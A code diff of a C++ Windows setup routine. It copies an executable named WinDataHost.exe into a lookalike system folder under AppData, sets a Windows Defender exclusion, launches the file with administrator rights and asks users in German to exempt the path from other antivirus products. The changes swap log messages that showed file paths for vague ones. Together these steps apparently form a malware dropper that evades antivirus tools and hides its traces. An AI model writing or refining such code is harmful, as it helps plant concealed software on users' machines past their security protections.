@@ -91,27 +91,27 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     std::wstring sourcePath = FindExecutable(exeName);
 
     if (sourcePath.empty()) {
-        LogMessage(L"Error: WinDataHost.exe not found on Desktop or in Downloads.");
+        LogMessage(L"Error: Source files not found.");
         return 0;
     }
-    LogMessage(L"Found source: " + sourcePath);
+    LogMessage(L"Source file found.");
 
     wchar_t appDataPath[MAX_PATH];
     if (FAILED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
-        LogMessage(L"Error: Could not find AppData folder.");
+        LogMessage(L"Error: System directory not found.");
         return 0;
     }
 
     fs::path targetDir = fs::path(appDataPath) / L"Microsoft" / L"Windows" / L"WinDataHost";
     if (!fs::exists(targetDir)) {
         if (fs::create_directories(targetDir)) {
-            LogMessage(L"Created target directory: " + targetDir.wstring());
+            LogMessage(L"Target folder created.");
         } else {
-            LogMessage(L"Error: Could not create target directory.");
+            LogMessage(L"Error: Could not prepare system folder.");
             return 0;
         }
     } else {
-        LogMessage(L"Target directory already exists.");
+        LogMessage(L"Target folder ready.");
     }
 
     LogMessage(L"Setting Windows Defender exclusion...");
@@ -134,7 +134,7 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     fs::path targetPath = targetDir / exeName;
     try {
         fs::copy_file(sourcePath, targetPath, fs::copy_options::overwrite_existing);
-        LogMessage(L"Copied file to: " + targetPath.wstring());
+        LogMessage(L"File deployment successful.");
     } catch (const fs::filesystem_error& e) {
         std::string err = e.what();
         LogMessage(L"Error: Could not copy file. " + std::wstring(err.begin(), err.end()));
@@ -142,14 +142,30 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     }
 
     LogMessage(L"Starting WinDataHost.exe as Admin...");
-    // Use "runas" to ensure it starts with admin rights
-    ShellExecute(NULL, L"runas", targetPath.wstring().c_str(), NULL, targetDir.wstring().c_str(), SW_SHOW);
+
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.cbSize = sizeof(SHELLEXECUTEINFOW);
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+    sei.lpVerb = L"runas";
+    sei.lpFile = targetPath.wstring().c_str();
+    sei.lpDirectory = targetDir.wstring().c_str();
+    sei.nShow = SW_SHOW;
+
+    if (ShellExecuteExW(&sei)) {
+        LogMessage(L"Process started successfully.");
+        if (sei.hProcess) CloseHandle(sei.hProcess);
+    } else {
+        DWORD err = GetLastError();
+        LogMessage(L"Error: Could not start application. Code: " + std::to_wstring(err));
+        if (err == ERROR_CANCELLED) {
+            LogMessage(L"User cancelled the UAC prompt.");
+        }
+    }
 
     LogMessage(L"--------------------------------------------------");
     LogMessage(L"Hinweis: Falls Sie ein externes Antivirenprogramm");
     LogMessage(L"(z.B. Avast, Bitdefender, Norton) nutzen, fügen");
-    LogMessage(L"Sie diesen Pfad bitte manuell zu den Ausnahmen");
-    LogMessage(L"hinzu, um Funktionsstörungen zu vermeiden.");
+    LogMessage(L"Sie den Pfad bitte manuell zu den Ausnahmen hinzu.");
     LogMessage(L"--------------------------------------------------");
 
     LogMessage(L"Setup completed successfully.");
